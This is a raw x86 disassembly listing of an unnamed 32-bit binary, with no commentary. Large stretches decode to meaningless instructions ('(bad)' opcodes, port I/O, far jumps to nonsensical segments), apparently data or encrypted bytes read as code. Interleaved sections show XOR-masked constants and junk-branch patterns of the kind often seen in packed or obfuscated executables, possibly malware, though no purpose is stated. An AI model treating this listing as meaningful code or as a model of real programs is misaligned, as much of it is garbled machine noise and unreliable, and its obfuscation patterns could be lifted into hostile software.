  420cfe:	adc    BYTE PTR [esi],ah
  420d00:	adc    DWORD PTR [eax+eiz*1+0x5],eax
  420d04:	xchg   ecx,edx
  420d06:	fwait
  420d07:	jg     0x420d3e
  420d09:	loop   0x420d68
  420d0b:	mov    BYTE PTR [ebp+0x66],bh
  420d0e:	xchg   edi,eax
  420d0f:	and    DWORD PTR [edi-0x7],ecx
  420d12:	mov    edi,0x2862817f
  420d17:	ror    edx,1
  420d19:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  420d1b:	scas   eax,DWORD PTR es:[edi]
  420d1c:	repz popa 
  420d1e:	stc    
  420d1f:	das    
  420d20:	xor    eax,0xa5a84d36
  420d25:	and    al,0x38
  420d27:	dec    edx
  420d28:	inc    eax
  420d29:	enter  0xef94,0x24
  420d2d:	cdq    
  420d2e:	(bad)  
  420d2f:	jmp    0x420d8f
  420d31:	dec    eax
  420d32:	stc    
  420d33:	xchg   edi,eax
  420d34:	data16 jl 0x420cde
  420d37:	shr    BYTE PTR [ebp+0x3b],1
  420d3a:	push   0xffffffd0
  420d3c:	jno    0x420cc9
  420d3e:	mov    ecx,0x4df7878f
  420d43:	pusha  
  420d44:	std    
  420d45:	jmp    0x308c:0x92aa74f3
  420d4c:	(bad)  
  420d4d:	add    edx,edi
  420d4f:	jne    0x420d6f
  420d51:	sub    al,0x36
  420d53:	inc    ebp
  420d54:	sar    DWORD PTR [edx+0x16],1
  420d57:	je     0x420d7b
  420d59:	xor    ch,BYTE PTR [edx]
  420d5b:	enter  0x3baa,0xc7
  420d5f:	push   ss
  420d60:	shl    dl,1
  420d62:	aad    0xa8
  420d64:	enter  0xd55a,0xe5
  420d68:	imul   bh
  420d6a:	(bad)  
  420d6b:	icebp  
  420d6c:	out    dx,al
  420d6d:	mov    WORD PTR [edx],cs
  420d6f:	sbb    BYTE PTR [ebp-0x62],0x7b
  420d73:	push   edi
  420d74:	jl     0x420d63
  420d76:	xor    al,0xb5
  420d78:	fwait
  420d79:	icebp  
  420d7a:	in     eax,dx
  420d7b:	fld    DWORD PTR [ecx+0x4c0e6dc8]
  420d81:	imul   edx,DWORD PTR [edx],0x41ec24e6
  420d87:	aaa    
  420d88:	stc    
  420d89:	cld    
  420d8a:	pop    ebx
  420d8b:	out    dx,eax
  420d8c:	push   ecx
  420d8d:	icebp  
  420d8e:	push   esp
  420d8f:	aad    0xab
  420d91:	test   DWORD PTR ds:0x8c024b4,esi
  420d97:	fwait
  420d98:	jnp    0x420d8e
  420d9a:	mov    bh,0x5a
  420d9c:	push   edx
  420d9d:	test   DWORD PTR [ecx],esp
  420d9f:	push   0xffffffd0
  420da1:	sbb    al,0xf8
  420da3:	pop    eax
  420da4:	mov    ebx,0x8b87dc55
  420da9:	mov    ds:0xeadd0554,al
  420dae:	push   ds
  420daf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420db0:	cmp    al,0x6c
  420db2:	dec    esi
  420db3:	pop    edi
  420db4:	nop
  420db5:	arpl   WORD PTR [esi-0x44],cx
  420db8:	bound  esp,QWORD PTR [ecx+0x6d2fea06]
  420dbe:	push   ebx
  420dbf:	sbb    ebp,DWORD PTR [ebp-0x4a]
  420dc2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420dc3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420dc4:	mov    ?,WORD PTR [esi+eiz*1]
  420dc7:	fst    DWORD PTR [edx+0x494069f]
  420dcd:	clc    
  420dce:	mov    ds:0x7990fa4f,al
  420dd3:	iret   
  420dd4:	hlt    
  420dd5:	jae    0x420e4f
  420dd7:	out    dx,eax
  420dd8:	test   BYTE PTR [edx+0x71363c64],0xaf
  420ddf:	adc    eax,0x8fcda45f
  420de4:	mov    al,ds:0xad9af92c
  420de9:	jge    0x420db9
  420deb:	sbb    ebx,DWORD PTR cs:[esi]
  420dee:	push   edi
  420def:	or     DWORD PTR [ecx+0x59],ebp
  420df2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420df3:	data16 ficomp WORD PTR [edi-0x73fa762d]
  420dfa:	out    dx,al
  420dfb:	mov    ds:0x7c6e693e,eax
  420e00:	push   ecx
  420e01:	xor    esp,DWORD PTR [esi+0x55540d63]
  420e07:	or     ebx,ebx
  420e09:	sbb    bh,BYTE PTR [ebp-0x75da48cd]
  420e0f:	(bad)  
  420e10:	mov    BYTE PTR [edx],bl
  420e12:	fstp   TBYTE PTR [esp+edi*2+0x10]
  420e16:	enter  0x230a,0x2e
  420e1a:	outs   dx,BYTE PTR ds:[esi]
  420e1b:	pop    es
  420e1c:	pop    esp
  420e1d:	push   ds
  420e1e:	jle    0x420e5d
  420e20:	jne    0x420e1a
  420e22:	and    ah,cl
  420e24:	mov    cl,BYTE PTR [edx-0x1a]
  420e27:	jno    0x420dfc
  420e29:	dec    ebx
  420e2a:	sbb    edx,DWORD PTR [ebx]
  420e2c:	ds cmp bh,ah
  420e2f:	xchg   esi,eax
  420e30:	xchg   edx,eax
  420e31:	lock fsubrp st(6),st
  420e34:	inc    ebp
  420e35:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420e36:	dec    edx
  420e37:	jge    0x420e43
  420e39:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420e3a:	leave  
  420e3b:	push   0xfa1e7ce
  420e40:	mov    dl,0x10
  420e42:	add    DWORD PTR [ebx-0xa4381f7],eax
  420e48:	push   esp
  420e49:	cmp    ch,BYTE PTR [esi+0x36]
  420e4c:	or     DWORD PTR [edi-0x51143379],edi
  420e52:	push   edi
  420e53:	ja     0x420ed3
  420e55:	inc    edx
  420e56:	ror    DWORD PTR [ecx+eax*4-0x16],0xad
  420e5b:	sub    DWORD PTR [eax],eax
  420e5d:	add    BYTE PTR [ebx+0x42818b35],cl
  420e63:	add    BYTE PTR [ecx],bl
  420e65:	xor    eax,0x42837f
  420e6a:	imul   edx,eax
  420e6d:	cmp    DWORD PTR ds:0x42839b,0x0
  420e74:	mov    DWORD PTR ds:0x428253,ebx
  420e7a:	mov    DWORD PTR ds:0x42818b,0x153
  420e84:	jmp    0x420efa
  420e89:	mov    eax,ds:0x42817f
  420e8e:	mov    DWORD PTR ds:0x428263,0x776f
  420e98:	cmp    DWORD PTR ds:0x42839b,0x0
  420e9f:	jle    0x420ecd
  420ea5:	push   0x428237
  420eaa:	push   0x42809f
  420eaf:	call   DWORD PTR ds:0x428e58
  420eb5:	add    ecx,DWORD PTR ds:0x428397
  420ebb:	xor    esi,DWORD PTR ds:0x42822f
  420ec1:	adc    DWORD PTR ds:0x428287,edx
  420ec7:	xor    DWORD PTR ds:0x42830f,edx
  420ecd:	mov    esi,DWORD PTR ds:0x42823b
  420ed3:	or     esi,DWORD PTR ds:0x428197
  420ed9:	mov    DWORD PTR ds:0x42823b,esi
  420edf:	and    ecx,ecx
  420ee1:	neg    DWORD PTR ds:0x42826f
  420ee7:	dec    ecx
  420ee8:	movzx  eax,WORD PTR ds:0x428157
  420eef:	sbb    eax,DWORD PTR ds:0x42830b
  420ef5:	mov    ds:0x428157,eax
  420efa:	mov    eax,DWORD PTR [ebp-0x90]
  420f00:	xor    esi,esi
  420f02:	add    esi,DWORD PTR ds:0x428207
  420f08:	xor    ecx,ecx
  420f0a:	add    ecx,DWORD PTR ds:0x42835f
  420f10:	sub    ecx,esi
  420f12:	xor    esi,DWORD PTR [esi+ecx*1]
  420f15:	lea    eax,[eax+edx*1+0x14f2e240]
  420f1c:	cmp    DWORD PTR ds:0x42830f,0x0
  420f23:	mov    DWORD PTR ds:0x4282a3,0x1362
  420f2d:	mov    DWORD PTR ds:0x428253,edx
  420f33:	mov    DWORD PTR ds:0x42828f,edi
  420f39:	jmp    0x421029
  420f3e:	mov    DWORD PTR ds:0x428373,0xeb5
  420f48:	cmp    DWORD PTR ds:0x42830f,0x0
  420f4f:	ja     0x420f81
  420f55:	push   DWORD PTR [ebp-0x24]
  420f58:	push   DWORD PTR [ebp-0x14]
  420f5b:	push   DWORD PTR [ebp-0x14]
  420f5e:	call   DWORD PTR ds:0x428ed0
  420f64:	neg    ecx
  420f66:	xor    esi,esi
  420f68:	or     esi,DWORD PTR ds:0x4281df
  420f6e:	xor    edx,edx
  420f70:	add    edx,DWORD PTR ds:0x4281eb
  420f76:	sub    edx,esi
  420f78:	or     esi,DWORD PTR [esi+edx*1]
  420f7b:	sub    DWORD PTR ds:0x428267,ecx
  420f81:	mov    edx,DWORD PTR ds:0x42825f
  420f87:	sbb    edx,DWORD PTR ds:0x4283a7
  420f8d:	mov    DWORD PTR ds:0x42825f,edx
  420f93:	add    DWORD PTR ds:0x42819b,ecx
  420f99:	sub    DWORD PTR ds:0x42838b,0x4282fb
  420fa3:	cmp    DWORD PTR ds:0x428287,0x0
  420faa:	mov    ecx,DWORD PTR ds:0x42836b
  420fb0:	movzx  edx,BYTE PTR ds:0x428173
  420fb7:	mov    DWORD PTR ds:0x4282f7,0x5580
  420fc1:	mov    DWORD PTR ds:0x4283a3,edi
  420fc7:	jmp    0x421029
  420fcc:	mov    DWORD PTR ds:0x4283a7,0x673a
  420fd6:	cmp    DWORD PTR ds:0x428287,0x0
  420fdd:	jle    0x420ffa
  420fe3:	push   DWORD PTR [ebp-0x20]
  420fe6:	call   DWORD PTR ds:0x428d74
  420fec:	xor    esi,edx
  420fee:	add    ecx,0x6ba8
  420ff4:	xor    edx,0x4b1f
  420ffa:	mov    edx,DWORD PTR ds:0x428307
  421000:	sbb    DWORD PTR ds:0x428283,edx
  421006:	movzx  edx,WORD PTR ds:0x42815b
  42100d:	or     edx,DWORD PTR ds:0x428383
  421013:	mov    DWORD PTR ds:0x42815b,edx
  421019:	dec    DWORD PTR ds:0x428373
  42101f:	sub    DWORD PTR ds:0x42827f,0x689b
  421029:	mov    DWORD PTR [ebp-0x174],eax
  42102f:	mov    eax,DWORD PTR [ebp-0x24]
  421032:	mov    ecx,DWORD PTR [ebp-0x94]
  421038:	add    esi,edx
  42103a:	mov    edx,DWORD PTR [ebp-0x10]
  42103d:	neg    esi
  42103f:	xor    edx,ecx
  421041:	cmp    DWORD PTR ds:0x42816b,0x0
  421048:	mov    DWORD PTR ds:0x428377,0x62d9
  421052:	mov    DWORD PTR ds:0x428157,0x300d
  42105c:	mov    DWORD PTR ds:0x42815b,0x20bd
  421066:	mov    ecx,DWORD PTR ds:0x4282ff
  42106c:	jmp    0x4210b5
  421071:	mov    DWORD PTR ds:0x42836f,0x134d
  42107b:	cmp    DWORD PTR ds:0x42816b,0x0
  421082:	jae    0x4210a9
  421088:	push   DWORD PTR [ebp-0xc]
  42108b:	push   0x4ac4
  421090:	push   DWORD PTR [ebp-0x24]
  421093:	push   0x863f
  421098:	push   DWORD PTR [ebp-0x28]
  42109b:	call   DWORD PTR ds:0x428d94
  4210a1:	sbb    ecx,DWORD PTR ds:0x428283
  4210a7:	adc    esi,esi
  4210a9:	and    DWORD PTR ds:0x4282a7,edi
  4210af:	sbb    ecx,DWORD PTR ds:0x428163
  4210b5:	add    edx,DWORD PTR [ebp-0x78]
  4210b8:	mov    ecx,DWORD PTR [ebp-0xc0]
  4210be:	lea    ecx,[edx+ecx*1+0x6ac1]
  4210c5:	and    ecx,eax
  4210c7:	mov    eax,0x1101
  4210cc:	sub    eax,ecx
  4210ce:	add    eax,DWORD PTR [ebp+0x8]
  4210d1:	mov    DWORD PTR [ebp-0x170],eax
  4210d7:	mov    DWORD PTR [ebp-0x15c],0xca79a575
  4210e1:	mov    DWORD PTR [ebp-0x158],0x9c1b89e8
  4210eb:	mov    DWORD PTR [ebp-0x154],0xca79a571
  4210f5:	mov    DWORD PTR [ebp-0x150],0x9c1b89e8
  4210ff:	mov    esi,DWORD PTR [ebp-0x174]
  421105:	mov    eax,DWORD PTR [ebp-0x154]
  42110b:	mov    edx,DWORD PTR [ebp-0x150]
  421111:	xor    eax,0xca79a575
  421116:	xor    edx,0x9c1b89e8
  42111c:	mov    cl,0x2
  42111e:	call   0x40a9b5
  421123:	mov    edi,eax
  421125:	mov    ebx,edx
  421127:	mov    eax,DWORD PTR [ebp-0x154]
  42112d:	mov    edx,DWORD PTR [ebp-0x150]
  421133:	xor    eax,0xca79a575
  421138:	xor    edx,0x9c1b89e8
  42113e:	mov    cl,0x3e
  421140:	call   0x422235
  421145:	or     edi,eax
  421147:	or     ebx,edx
  421149:	jmp    0x421378
  42114e:	test   al,0x92
  421150:	fdivr  st,st(3)
  421152:	and    bh,BYTE PTR [edx]
  421154:	call   0x61bc:0x65828d2a
  42115b:	sbb    ebp,ecx
  42115d:	stos   BYTE PTR es:[edi],al
  42115e:	ror    DWORD PTR [edi],0x16
  421161:	sbb    ah,bh
  421163:	adc    al,0x18
  421165:	sbb    BYTE PTR [eax+0x53],ah
  421168:	dec    ebx
  421169:	sub    DWORD PTR [edi+0x4d0b1b9e],esi
  42116f:	dec    esp
  421170:	jmp    0x421108
  421172:	out    dx,al
  421173:	xor    al,0xee
  421175:	xchg   esi,eax
  421176:	adc    eax,0xe20a2aa5
  42117b:	mov    ebx,0x1b17bfaa
  421180:	dec    ebx
  421181:	xchg   edx,eax
  421182:	retf   0x6edb
  421185:	idiv   DWORD PTR [esp+ebp*4+0x36]
  421189:	jo     0x4211d4
  42118b:	push   edx
  42118c:	aam    0x49
  42118e:	in     al,dx
  42118f:	sub    BYTE PTR [ebx],0x3b
  421192:	and    al,0x88
  421194:	pop    ds
  421195:	daa    
  421196:	push   cs
  421197:	retf   0xb8f1
  42119a:	dec    ecx
  42119b:	push   edi
  42119c:	and    dl,BYTE PTR [edx-0x66]
  42119f:	push   esi
  4211a0:	test   BYTE PTR [ecx-0x4060d43f],dl
  4211a6:	mov    ds:0x412848d,eax
  4211ab:	mov    esp,edx
  4211ad:	push   ebp
  4211ae:	test   ecx,eax
  4211b0:	xor    BYTE PTR [edx-0x2c],ah
  4211b3:	js     0x4211b5
  4211b5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4211b6:	outs   dx,BYTE PTR ds:[esi]
  4211b7:	lea    esi,[ebp-0x6dc070ae]
  4211bd:	jns    0x4211b9
  4211bf:	nop
  4211c0:	jp     0x421143
  4211c2:	inc    esi
  4211c3:	mov    dl,0xb6
  4211c5:	ss pop esi
  4211c7:	mov    edi,0xb5469083
  4211cc:	pop    ebp
  4211cd:	fcmovu st,st(3)
  4211cf:	pop    edx
  4211d0:	(bad)  
  4211d1:	cld    
  4211d2:	js     0x421178
  4211d4:	out    0x40,al
  4211d6:	pop    es
  4211d7:	sub    BYTE PTR ds:0x42e80d4f,al
  4211dd:	dec    ebx
  4211de:	repnz push eax
  4211e0:	push   0xffffff80
  4211e2:	stc    
  4211e3:	mov    edx,0x3272a965
  4211e8:	and    BYTE PTR [ecx],0x90
  4211eb:	hlt    
  4211ec:	sbb    eax,0xe2694a13
  4211f1:	cmp    bh,BYTE PTR [edx+0xf]
  4211f4:	clc    
  4211f5:	stos   BYTE PTR es:[edi],al
  4211f6:	cwde   
  4211f7:	test   BYTE PTR [ebx+ecx*1-0x76b37e9c],ch
  4211fe:	mov    dh,0xe0
  421200:	inc    esp
  421201:	inc    esp
  421202:	jecxz  0x4211ea
  421204:	sub    ah,BYTE PTR [esi-0x6d]
  421207:	jno    0x421225
  421209:	test   BYTE PTR [edi],cl
  42120b:	bound  esi,QWORD PTR [eax+0x52]
  42120e:	xor    eax,0xdfcfbf1c
  421213:	jb     0x4211c3
  421215:	mov    eax,ds:0x7690329c
  42121a:	nop
  42121b:	xor    eax,0xf6da3ff1
  421220:	loopne 0x4211c2
  421222:	pop    ss
  421223:	sbb    BYTE PTR [edx-0x6471b42b],bh
  421229:	adc    al,BYTE PTR [ebx]
  42122b:	popa   
  42122c:	mov    ecx,0xd3f85d9d
  421231:	sub    ebp,esi
  421233:	retf   
  421234:	jmp    0x58911df9
  421239:	jg     0x4211e5
  42123b:	xchg   ecx,eax
  42123c:	mov    esp,0x440dab89
  421241:	int3   
  421242:	push   ebp
  421243:	mov    WORD PTR [eax],?
  421245:	cmp    al,0xe7
  421247:	mov    dh,0xa
  421249:	pop    ds
  42124a:	(bad)  
  42124b:	mov    ah,0x30
  42124d:	leave  
  42124e:	test   al,dl
  421250:	sub    ebp,ebx
  421252:	push   ds
  421253:	and    ebp,0xffffffc4
  421256:	xchg   ebp,eax
  421257:	retf   
  421258:	out    0x49,eax
  42125a:	adc    BYTE PTR [esi+0x76d4e8c7],ch
  421260:	out    dx,eax
  421261:	mov    ds:0xc0ede506,al
  421266:	(bad)  
  421267:	mov    edx,es
  421269:	xchg   DWORD PTR [eax+0x58],edi
  42126c:	jmp    0x3d09d81c
  421271:	mov    esi,0xd46e7a98
  421276:	dec    ebp
  421277:	addr16 jne 0x421260
  42127a:	mov    dh,0x1c
  42127c:	pop    esp
  42127d:	or     bh,BYTE PTR [edi+0x13221071]
  421283:	jmp    0x42127b
  421285:	push   cs
  421286:	dec    eax
  421287:	ficomp WORD PTR gs:[ebp+0x13]
  42128b:	push   ss
  42128c:	jae    0x42120f
  42128e:	cmp    BYTE PTR [edi-0x4a],cl
  421291:	and    eax,edi
  421293:	sbb    BYTE PTR [eax-0x49f7236f],0x26
  42129a:	dec    ebp
  42129b:	and    eax,0x6cbe4591
  4212a0:	cmp    bh,bh
  4212a2:	push   esi
  4212a3:	jno    0x421245
  4212a5:	fisttp DWORD PTR [eax]
  4212a7:	(bad)  
  4212a8:	dec    edi
  4212a9:	lock lods al,BYTE PTR ds:[esi]
  4212ab:	mov    DWORD PTR [ebp-0x6c],esp
  4212ae:	ret    0xb2dd
  4212b1:	mov    esp,0x96ee4506
  4212b6:	push   es
  4212b7:	xor    DWORD PTR [edi-0x45],eax
  4212ba:	call   FWORD PTR [eax+0xa]
  4212bd:	(bad)  
  4212be:	out    0xe2,al
  4212c0:	jae    0x421268
  4212c2:	ins    BYTE PTR es:[edi],dx
  4212c3:	dec    ecx
  4212c4:	nop
  4212c5:	sbb    al,0x37
  4212c7:	jl     0x421309
  4212c9:	icebp  
  4212ca:	hlt    
  4212cb:	and    BYTE PTR [eax],bh
  4212cd:	loopne 0x421305
  4212cf:	sub    al,0xea
  4212d1:	or     al,BYTE PTR ds:0x98ac95da
  4212d7:	sbb    eax,0x7ac3172d
  4212dc:	mov    dh,dh
  4212de:	push   eax
  4212df:	sub    dh,BYTE PTR [ebx*2-0x73def81a]
  4212e6:	push   ebx
  4212e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4212e8:	xlat   BYTE PTR ds:[ebx]
  4212e9:	sbb    ecx,DWORD PTR [edi+0xc712c0d]
  4212ef:	out    dx,al
  4212f0:	arpl   bp,dx
  4212f2:	test   esp,ebx
  4212f4:	mov    al,ds:0x61c280c
  4212f9:	mov    cl,0x6f
  4212fb:	stos   DWORD PTR es:[edi],eax
  4212fc:	and    BYTE PTR [edi+edx*1+0x2],bl
  421300:	scas   eax,DWORD PTR es:[edi]
  421301:	sub    dl,dl
  421303:	leave  
  421304:	js     0x4212b4
  421306:	in     eax,0xd
  421308:	and    DWORD PTR [edx],0x3
  42130b:	pop    edx
  42130c:	mov    dh,0x5e
  42130e:	fld    DWORD PTR [esi]
  421310:	imul   edi,DWORD PTR [ebx],0x6e
  421313:	push   cs
  421314:	mov    ch,0x2b
  421316:	lock repnz aad 0xae
  42131a:	icebp  
  42131b:	jbe    0x4212dc
  42131d:	fld    QWORD PTR [edi-0x3e]
  421320:	xchg   esp,eax
  421321:	jne    0x421348
  421323:	cdq    
  421324:	or     al,0x7d
  421326:	sbb    al,0xb4
  421328:	aaa    
  421329:	inc    eax
  42132a:	ficom  WORD PTR [edx+0x55]
  42132d:	mov    al,ds:0xaa37aade
  421332:	pusha  
  421333:	and    eax,0x41aadc6b
  421338:	aaa    
  421339:	xchg   esp,eax
  42133a:	jnp    0x4212d9
  42133c:	or     ah,BYTE PTR [eax-0x5f7ea5e0]
  421342:	and    eax,0x62d5ef97
  421347:	adc    BYTE PTR [esp+ecx*4-0x3a4cb09],0x4b
  42134f:	mov    ds:0xca6f7d85,eax
  421354:	sub    ecx,DWORD PTR [edx]
  421356:	shl    DWORD PTR [edi-0x4f],1
  421359:	fst    QWORD PTR [esi]
  42135b:	mov    ebp,0x4f1a1c39
  421360:	sub    al,0xcf
  421362:	mov    DWORD PTR [edi+0x1f],esi
  421365:	push   ebx
  421366:	push   ebx
  421367:	pop    es
  421368:	imul   edi,ecx,0x8af08e4b
  42136e:	pop    ebp
  42136f:	push   ecx
  421370:	xor    DWORD PTR [ecx],esp
  421372:	push   edi
  421373:	ds enter 0x1865,0x6a
  421378:	mov    eax,DWORD PTR [ebp-0x15c]
  42137e:	mov    edx,DWORD PTR [ebp-0x158]
  421384:	xor    eax,0xca79a575
  421389:	xor    edx,0x9c1b89e8
  42138f:	mov    cl,0x2
  421391:	call   0x40a9b5
  421396:	mov    ecx,edx
  421398:	mov    edx,DWORD PTR [ebp-0x15c]
  42139e:	mov    DWORD PTR [ebp-0x218],esi
  4213a4:	mov    esi,DWORD PTR [ebp-0x158]
  4213aa:	xor    edx,0xca79a575
  4213b0:	xor    esi,0x9c1b89e8
  4213b6:	mov    DWORD PTR [ebp-0x21c],eax
  4213bc:	mov    eax,edx
  4213be:	mov    edx,esi
  4213c0:	mov    DWORD PTR [ebp-0x220],ecx
  4213c6:	mov    cl,0x3e
  4213c8:	call   0x422235
  4213cd:	mov    esi,DWORD PTR [ebp-0x21c]
  4213d3:	or     esi,eax
  4213d5:	mov    eax,DWORD PTR [ebp-0x220]
  4213db:	or     eax,edx
  4213dd:	push   eax
  4213de:	push   esi
  4213df:	push   ebx
  4213e0:	push   edi
  4213e1:	call   0x416c20
  4213e6:	mov    esi,DWORD PTR [ebp-0x218]
  4213ec:	cmp    esi,eax
  4213ee:	jne    0x4214a4
  4213f4:	mov    eax,DWORD PTR [ebp-0x154]
  4213fa:	mov    edx,DWORD PTR [ebp-0x150]
  421400:	xor    eax,0xca79a575
  421405:	xor    edx,0x9c1b89e8
  42140b:	mov    cl,0x2
  42140d:	call   0x40a9b5
  421412:	mov    esi,eax
  421414:	mov    edi,edx
  421416:	mov    eax,DWORD PTR [ebp-0x154]
  42141c:	mov    edx,DWORD PTR [ebp-0x150]
  421422:	xor    eax,0xca79a575
  421427:	xor    edx,0x9c1b89e8
  42142d:	mov    cl,0x3e
  42142f:	call   0x422235
  421434:	or     esi,eax
  421436:	or     edi,edx
  421438:	mov    eax,DWORD PTR [ebp-0x15c]
  42143e:	mov    edx,DWORD PTR [ebp-0x158]
  421444:	xor    eax,0xca79a575
  421449:	xor    edx,0x9c1b89e8
  42144f:	mov    cl,0x2
  421451:	call   0x40a9b5
  421456:	mov    ebx,eax
  421458:	mov    eax,edx
  42145a:	mov    ecx,DWORD PTR [ebp-0x15c]
  421460:	mov    edx,DWORD PTR [ebp-0x158]
  421466:	xor    ecx,0xca79a575
  42146c:	xor    edx,0x9c1b89e8
  421472:	mov    DWORD PTR [ebp-0x224],eax
  421478:	mov    eax,ecx
  42147a:	mov    cl,0x3e
  42147c:	call   0x422235
  421481:	or     ebx,eax
  421483:	mov    eax,DWORD PTR [ebp-0x224]
  421489:	or     eax,edx
  42148b:	push   eax
  42148c:	push   ebx
  42148d:	push   edi
  42148e:	push   esi
  42148f:	call   0x416c20
  421494:	mov    DWORD PTR [ebp-0x178],eax
  42149a:	jmp    0x421764
  42149f:	jmp    0x42171a
  4214a4:	lea    eax,[ebp-0x168]
  4214aa:	mov    DWORD PTR [ebp-0x164],eax
  4214b0:	mov    eax,DWORD PTR [ebp-0x164]
  4214b6:	mov    DWORD PTR [eax],0xa4069aae
  4214bc:	mov    eax,DWORD PTR [ebp-0x168]
  4214c2:	xor    eax,0xa4069aae
  4214c7:	shr    eax,0x2
  4214ca:	mov    ecx,DWORD PTR [ebp-0x168]
  4214d0:	xor    ecx,0xa4069aae
  4214d6:	shl    ecx,0x1e
  4214d9:	or     eax,ecx
  4214db:	mov    ecx,DWORD PTR [ebp-0x174]
  4214e1:	mov    eax,DWORD PTR [ecx+eax*8+0x78]
  4214e5:	mov    DWORD PTR [ebp-0x160],eax
  4214eb:	mov    esi,DWORD PTR [ebp-0x160]
  4214f1:	mov    eax,DWORD PTR [ebp-0x154]
  4214f7:	mov    edx,DWORD PTR [ebp-0x150]
  4214fd:	xor    eax,0xca79a575
  421502:	xor    edx,0x9c1b89e8
  421508:	mov    cl,0x2
  42150a:	call   0x40a9b5
  42150f:	mov    edi,eax
  421511:	mov    ebx,edx
  421513:	mov    eax,DWORD PTR [ebp-0x154]
  421519:	mov    edx,DWORD PTR [ebp-0x150]
  42151f:	xor    eax,0xca79a575
  421524:	xor    edx,0x9c1b89e8
  42152a:	mov    cl,0x3e
  42152c:	call   0x422235
  421531:	or     edi,eax
  421533:	or     ebx,edx
  421535:	mov    eax,DWORD PTR [ebp-0x15c]
  42153b:	mov    edx,DWORD PTR [ebp-0x158]
  421541:	xor    eax,0xca79a575
  421546:	xor    edx,0x9c1b89e8
  42154c:	mov    cl,0x2
  42154e:	call   0x40a9b5
  421553:	mov    ecx,edx
  421555:	mov    edx,DWORD PTR [ebp-0x15c]
  42155b:	mov    DWORD PTR [ebp-0x228],esi
  421561:	mov    esi,DWORD PTR [ebp-0x158]
  421567:	xor    edx,0xca79a575
  42156d:	xor    esi,0x9c1b89e8
  421573:	mov    DWORD PTR [ebp-0x22c],eax
  421579:	mov    eax,edx
  42157b:	mov    edx,esi
  42157d:	mov    DWORD PTR [ebp-0x230],ecx
  421583:	mov    cl,0x3e
  421585:	call   0x422235
  42158a:	mov    esi,DWORD PTR [ebp-0x22c]
  421590:	or     esi,eax
  421592:	mov    eax,DWORD PTR [ebp-0x230]
  421598:	or     eax,edx
  42159a:	push   eax
  42159b:	push   esi
  42159c:	push   ebx
  42159d:	push   edi
  42159e:	call   0x416c20
  4215a3:	mov    esi,DWORD PTR [ebp-0x228]
  4215a9:	cmp    esi,eax
  4215ab:	je     0x421620
  4215b1:	mov    eax,DWORD PTR [ebp-0x154]
  4215b7:	mov    edx,DWORD PTR [ebp-0x150]
  4215bd:	xor    eax,0xca79a575
  4215c2:	xor    edx,0x9c1b89e8
  4215c8:	mov    cl,0x2
  4215ca:	call   0x40a9b5
  4215cf:	mov    esi,eax
  4215d1:	mov    edi,edx
  4215d3:	mov    eax,DWORD PTR [ebp-0x154]
  4215d9:	mov    edx,DWORD PTR [ebp-0x150]
  4215df:	xor    eax,0xca79a575
  4215e4:	xor    edx,0x9c1b89e8
  4215ea:	mov    cl,0x3e
  4215ec:	call   0x422235
  4215f1:	or     esi,eax
  4215f3:	or     edi,edx
  4215f5:	mov    eax,DWORD PTR [ebp-0x160]
  4215fb:	imul   esi,eax
  4215fe:	add    esi,DWORD PTR [ebp-0x170]
  421604:	mov    DWORD PTR [ebp-0x16c],esi
  42160a:	mov    eax,DWORD PTR [ebp-0x16c]
  421610:	mov    DWORD PTR [ebp-0x178],eax
  421616:	jmp    0x421764
  42161b:	jmp    0x4216cb
  421620:	mov    eax,DWORD PTR [ebp-0x154]
  421626:	mov    edx,DWORD PTR [ebp-0x150]
  42162c:	xor    eax,0xca79a575
  421631:	xor    edx,0x9c1b89e8
  421637:	mov    cl,0x2
  421639:	call   0x40a9b5
  42163e:	mov    esi,eax
  421640:	mov    edi,edx
  421642:	mov    eax,DWORD PTR [ebp-0x154]
  421648:	mov    edx,DWORD PTR [ebp-0x150]
  42164e:	xor    eax,0xca79a575
  421653:	xor    edx,0x9c1b89e8
  421659:	mov    cl,0x3e
  42165b:	call   0x422235
  421660:	or     esi,eax
  421662:	or     edi,edx
  421664:	mov    eax,DWORD PTR [ebp-0x15c]
  42166a:	mov    edx,DWORD PTR [ebp-0x158]
  421670:	xor    eax,0xca79a575
  421675:	xor    edx,0x9c1b89e8
  42167b:	mov    cl,0x2
  42167d:	call   0x40a9b5
  421682:	mov    ebx,eax
  421684:	mov    eax,edx
  421686:	mov    ecx,DWORD PTR [ebp-0x15c]
  42168c:	mov    edx,DWORD PTR [ebp-0x158]
  421692:	xor    ecx,0xca79a575
  421698:	xor    edx,0x9c1b89e8
  42169e:	mov    DWORD PTR [ebp-0x234],eax
  4216a4:	mov    eax,ecx
  4216a6:	mov    cl,0x3e
  4216a8:	call   0x422235
  4216ad:	or     ebx,eax
  4216af:	mov    eax,DWORD PTR [ebp-0x234]
  4216b5:	or     eax,edx
  4216b7:	push   eax
  4216b8:	push   ebx
  4216b9:	push   edi
  4216ba:	push   esi
  4216bb:	call   0x416c20
  4216c0:	mov    DWORD PTR [ebp-0x178],eax
  4216c6:	jmp    0x421764
  4216cb:	mov    eax,DWORD PTR [ebp-0x15c]
  4216d1:	mov    edx,DWORD PTR [ebp-0x158]
  4216d7:	xor    eax,0xca79a575
  4216dc:	xor    edx,0x9c1b89e8
  4216e2:	mov    cl,0x2
  4216e4:	call   0x40a9b5
  4216e9:	mov    esi,eax
  4216eb:	mov    edi,edx
  4216ed:	mov    eax,DWORD PTR [ebp-0x15c]
  4216f3:	mov    edx,DWORD PTR [ebp-0x158]
  4216f9:	xor    eax,0xca79a575
  4216fe:	xor    edx,0x9c1b89e8
  421704:	mov    cl,0x3e
  421706:	call   0x422235
  42170b:	or     esi,eax
  42170d:	or     edi,edx
  42170f:	mov    DWORD PTR [ebp-0x178],esi
  421715:	jmp    0x421764
  42171a:	mov    eax,DWORD PTR [ebp-0x15c]
  421720:	mov    edx,DWORD PTR [ebp-0x158]
  421726:	xor    eax,0xca79a575
  42172b:	xor    edx,0x9c1b89e8
  421731:	mov    cl,0x2
  421733:	call   0x40a9b5
  421738:	mov    esi,eax
  42173a:	mov    edi,edx
